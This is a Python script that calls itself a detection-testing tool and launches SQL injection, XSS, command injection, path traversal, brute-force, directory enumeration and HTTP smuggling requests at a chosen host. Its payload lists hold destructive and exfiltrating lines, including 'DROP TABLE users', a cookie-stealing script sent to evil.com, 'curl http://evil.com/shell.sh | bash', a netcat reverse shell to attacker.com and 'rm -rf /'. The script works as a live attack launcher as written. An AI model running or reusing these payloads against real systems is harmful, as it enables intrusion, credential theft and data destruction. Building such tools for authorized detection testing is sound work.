#!/usr/bin/env python3
"""
Application Layer Attack Simulation - Tests detection of web/application attacks
For EDUCATIONAL and AUTHORIZED TESTING purposes only!
"""

import argparse
import time
import random
import socket
import string
import threading
from urllib.parse import quote
import requests
from typing import List

# Disable SSL warnings for testing
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass


class ApplicationAttacks:
    """Simulates various application layer attack patterns for detection testing"""
    
    def __init__(self, target: str, port: int = 80):
        self.target = target
        self.port = port
        self.base_url = f"http://{target}:{port}" if port != 443 else f"https://{target}"
        self.session = requests.Session()
        
    def sql_injection(self, count: int = 50) -> None:
        """
        SQL Injection Patterns - Sends requests with SQL injection payloads
        Detection: SQL keywords in parameters, unusual query patterns
        Severity: CRITICAL
        """
        print(f"\n[*] Starting SQL Injection Attack on {self.base_url}")
        print(f"[*] Count: {count} requests")
        print("[*] Expected Detection: SQL_INJECTION / SQLI_ATTEMPT")
        
        # Common SQL injection payloads
        sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "1' AND '1'='1",
            "1; DROP TABLE users--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "-1' UNION SELECT 1,2,3--",
            "1' AND SLEEP(5)--",
            "1' AND BENCHMARK(10000000,SHA1('test'))--",
            "admin' AND '1'='1",
            "' OR EXISTS(SELECT * FROM users)--",
            "'; EXEC xp_cmdshell('whoami')--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "1' HAVING 1=1--",
            "1' GROUP BY columnname HAVING 1=1--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; INSERT INTO users VALUES('hacker','hacked')--",
            "1; UPDATE users SET password='hacked'--",
            "' OR ASCII(SUBSTRING(password,1,1))>65--",
        ]
        
        request_count = 0
        
        for _ in range(count):
            payload = random.choice(sqli_payloads)
            
            # Test various injection points
            endpoints = [
                f"/login?username={quote(payload)}&password=test",
                f"/search?q={quote(payload)}",
                f"/user?id={quote(payload)}",
                f"/product?id={quote(payload)}",
                f"/page?id={quote(payload)}",
            ]
            
            endpoint = random.choice(endpoints)
            
            try:
                url = f"{self.base_url}{endpoint}"
                self.session.get(url, timeout=5, verify=False)
                request_count += 1
                
                if request_count % 10 == 0:
                    print(f"    [SQLi] Sent {request_count} injection attempts...")
                    
                time.sleep(0.1)
            except:
                request_count += 1  # Count even if request fails
                
        print(f"[+] SQL Injection complete - Sent {request_count} requests")
    
    def xss_attack(self, count: int = 50) -> None:
        """
        XSS (Cross-Site Scripting) Patterns - Sends requests with XSS payloads
        Detection: Script tags, event handlers in parameters
        Severity: HIGH
        """
        print(f"\n[*] Starting XSS Attack on {self.base_url}")
        print(f"[*] Count: {count} requests")
        print("[*] Expected Detection: XSS_ATTACK / CROSS_SITE_SCRIPTING")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>",
            "<object data='javascript:alert(1)'>",
            "<embed src='javascript:alert(1)'>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<video src=x onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
            "<svg/onload=alert('XSS')>",
            "<a href='javascript:alert(1)'>click</a>",
            "{{constructor.constructor('alert(1)')()}}",
            "${alert('XSS')}",
            "<%=alert('XSS')%>",
        ]
        
        request_count = 0
        
        for _ in range(count):
            payload = random.choice(xss_payloads)
            
            endpoints = [
                f"/search?q={quote(payload)}",
                f"/comment?text={quote(payload)}",
                f"/profile?name={quote(payload)}",
                f"/message?content={quote(payload)}",
            ]
            
            endpoint = random.choice(endpoints)
            
            try:
                url = f"{self.base_url}{endpoint}"
                self.session.get(url, timeout=5, verify=False)
                request_count += 1
                
                if request_count % 10 == 0:
                    print(f"    [XSS] Sent {request_count} XSS attempts...")
                    
                time.sleep(0.1)
            except:
                request_count += 1
                
        print(f"[+] XSS Attack complete - Sent {request_count} requests")
    
    def command_injection(self, count: int = 30) -> None:
        """
        OS Command Injection - Sends requests with command injection payloads
        Detection: Shell metacharacters, command patterns
        Severity: CRITICAL
        """
        print(f"\n[*] Starting Command Injection Attack on {self.base_url}")
        print(f"[*] Count: {count} requests")
        print("[*] Expected Detection: COMMAND_INJECTION / RCE_ATTEMPT")
        
        cmd_payloads = [
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "|| whoami",
            "`whoami`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; ls -la",
            "| ls -la",
            "; id",
            "& net user",
            "| net user",
            "; ping -c 3 127.0.0.1",
            "| ping 127.0.0.1",
            "; curl http://evil.com/shell.sh | bash",
            "$(curl http://evil.com/shell.sh)",
            "; wget http://evil.com/malware -O /tmp/mal",
            "& powershell -enc base64payload",
            "| nc -e /bin/sh attacker.com 4444",
            "; rm -rf /",
            "&& shutdown -h now",
        ]
        
        request_count = 0
        
        for _ in range(count):
            payload = random.choice(cmd_payloads)
            
            endpoints = [
                f"/ping?host=127.0.0.1{quote(payload)}",
                f"/lookup?domain=example.com{quote(payload)}",
                f"/convert?file=test.pdf{quote(payload)}",
                f"/exec?cmd={quote(payload)}",
            ]
            
            endpoint = random.choice(endpoints)
            
            try:
                url = f"{self.base_url}{endpoint}"
                self.session.get(url, timeout=5, verify=False)
                request_count += 1
                
                if request_count % 10 == 0:
                    print(f"    [CMD] Sent {request_count} command injection attempts...")
                    
                time.sleep(0.15)
            except:
                request_count += 1
                
        print(f"[+] Command Injection complete - Sent {request_count} requests")
    
    def path_traversal(self, count: int = 30) -> None:
        """
        Path Traversal/LFI - Attempts to access files outside web root
        Detection: ../ patterns, sensitive file paths
        Severity: HIGH
        """
        print(f"\n[*] Starting Path Traversal Attack on {self.base_url}")
        print(f"[*] Count: {count} requests")
        print("[*] Expected Detection: PATH_TRAVERSAL / LFI_ATTEMPT")
        
        lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd%00",
            "....//....//....//etc/shadow",
            "../../../var/log/apache2/access.log",
            "../../../proc/self/environ",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "/var/www/html/../../../etc/passwd",
            "....\\....\\....\\windows\\win.ini",
        ]
        
        request_count = 0
        
        for _ in range(count):
            payload = random.choice(lfi_payloads)
            
            endpoints = [
                f"/file?path={quote(payload)}",
                f"/download?file={quote(payload)}",
                f"/include?page={quote(payload)}",
                f"/view?template={quote(payload)}",
                f"/load?module={quote(payload)}",
            ]
            
            endpoint = random.choice(endpoints)
            
            try:
                url = f"{self.base_url}{endpoint}"
                self.session.get(url, timeout=5, verify=False)
                request_count += 1
                
                if request_count % 10 == 0:
                    print(f"    [LFI] Sent {request_count} path traversal attempts...")
                    
                time.sleep(0.1)
            except:
                request_count += 1
                
        print(f"[+] Path Traversal complete - Sent {request_count} requests")
    
    def brute_force(self, count: int = 100) -> None:
        """
        Brute Force Attack - Rapid login attempts
        Detection: Multiple failed logins from same source
        Severity: HIGH
        """
        print(f"\n[*] Starting Brute Force Attack on {self.base_url}")
        print(f"[*] Count: {count} attempts")
        print("[*] Expected Detection: BRUTE_FORCE / LOGIN_ATTACK")
        
        # Common usernames
        usernames = ["admin", "root", "user", "test", "administrator", "guest", "operator"]
        
        # Common passwords (for testing detection only)
        passwords = [
            "password", "123456", "admin", "root", "letmein", "welcome",
            "password123", "qwerty", "abc123", "monkey", "master", "dragon",
            "111111", "baseball", "iloveyou", "trustno1", "sunshine", "princess"
        ]
        
        attempt_count = 0
        
        for _ in range(count):
            username = random.choice(usernames)
            password = random.choice(passwords)
            
            try:
                url = f"{self.base_url}/login"
                self.session.post(url, data={
                    "username": username,
                    "password": password
                }, timeout=5, verify=False)
                attempt_count += 1
                
                if attempt_count % 20 == 0:
                    print(f"    [BRUTE] Sent {attempt_count} login attempts...")
                    
                time.sleep(0.05)  # Fast attempts
            except:
                attempt_count += 1
                
        print(f"[+] Brute Force complete - Sent {attempt_count} attempts")
    
    def directory_enumeration(self, count: int = 100) -> None:
        """
        Directory Enumeration - Attempts to find hidden directories
        Detection: High 404 rate, common sensitive paths
        Severity: MEDIUM
        """
        print(f"\n[*] Starting Directory Enumeration on {self.base_url}")
        print(f"[*] Count: {count} requests")
        print("[*] Expected Detection: DIRECTORY_ENUM / RECON_ACTIVITY")
        
        # Common directories to probe
        directories = [
            "admin", "administrator", "login", "wp-admin", "phpmyadmin",
            "backup", "backups", "bak", "old", "temp", "tmp", "test",
            "dev", "development", "staging", "api", "api/v1", "api/v2",
            ".git", ".svn", ".htaccess", ".env", "config", "configuration",
            "database", "db", "sql", "mysql", "postgres", "mongodb",
            "uploads", "files", "documents", "images", "assets",
            "private", "secret", "hidden", "internal", "intranet",
            "console", "dashboard", "portal", "manage", "manager",
            "cgi-bin", "scripts", "bin", "includes", "include",
            "wp-content", "wp-includes", "xmlrpc.php", "readme.html",
            "server-status", "server-info", "phpinfo.php", "info.php",
        ]
        
        request_count = 0
        
        for _ in range(count):
            directory = random.choice(directories)
            
            try:
                url = f"{self.base_url}/{directory}"
                self.session.get(url, timeout=5, verify=False)
                request_count += 1
                
                if request_count % 20 == 0:
                    print(f"    [ENUM] Sent {request_count} directory probes...")
                    
                time.sleep(0.05)
            except:
                request_count += 1
                
        print(f"[+] Directory Enumeration complete - Sent {request_count} requests")
    
    def http_smuggling(self, count: int = 20) -> None:
        """
        HTTP Request Smuggling - Malformed HTTP requests
        Detection: Conflicting Content-Length/Transfer-Encoding
        Severity: HIGH
        """
        print(f"\n[*] Starting HTTP Smuggling Attack on {self.target}:{self.port}")
        print(f"[*] Count: {count} requests")
        print("[*] Expected Detection: HTTP_SMUGGLING / MALFORMED_HTTP")
        
        request_count = 0
        
        # Various smuggling payloads
        smuggling_requests = [
            # CL.TE
            b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
            # TE.CL
            b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n12\r\nGETXSMUGGLED\r\n0\r\n\r\n",
            # TE.TE (obfuscated)
            b"POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\n",
            # Double Content-Length
            b"GET / HTTP/1.1\r\nHost: target\r\nContent-Length: 0\r\nContent-Length: 99\r\n\r\n",
        ]
        
        for _ in range(count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target, self.port))
                
                payload = random.choice(smuggling_requests)
                payload = payload.replace(b"target", self.target.encode())
                
                sock.send(payload)
                sock.close()
                request_count += 1
                
                if request_count % 5 == 0:
                    print(f"    [SMUGGLE] Sent {request_count} smuggling attempts...")
                    
                time.sleep(0.2)
            except:
                request_count += 1
                
        print(f"[+] HTTP Smuggling complete - Sent {request_count} requests")


def main():
    parser = argparse.ArgumentParser(description="Application Layer Attack Simulator")
    parser.add_argument("--target", "-t", default="127.0.0.1", help="Target IP/hostname")
    parser.add_argument("--port", "-p", type=int, default=80, help="Target port")
    parser.add_argument("--type", "-T", default="sqli",
                        choices=["sqli", "xss", "cmd", "lfi", "brute", "enum", "smuggle", "all"],
                        help="Attack type")
    parser.add_argument("--count", "-c", type=int, default=50, help="Number of requests")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("  APPLICATION ATTACK SIMULATOR - Detection Testing Tool")
    print("  ⚠️  WARNING: For authorized testing only!")
    print("=" * 60)
    print(f"  Target: {args.target}:{args.port}")
    print(f"  Attack Type: {args.type}")
    print(f"  Request Count: {args.count}")
    print("=" * 60)
    
    app = ApplicationAttacks(args.target, args.port)
    
    try:
        if args.type == "sqli" or args.type == "all":
            app.sql_injection(args.count)
        if args.type == "xss" or args.type == "all":
            app.xss_attack(args.count)
        if args.type == "cmd" or args.type == "all":
            app.command_injection(args.count // 2)
        if args.type == "lfi" or args.type == "all":
            app.path_traversal(args.count // 2)
        if args.type == "brute" or args.type == "all":
            app.brute_force(args.count * 2)
        if args.type == "enum" or args.type == "all":
            app.directory_enumeration(args.count * 2)
        if args.type == "smuggle" or args.type == "all":
            app.http_smuggling(20)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    
    print("\n[*] Attack simulation complete. Check PacketPeeper for detections!")


if __name__ == "__main__":
    main()
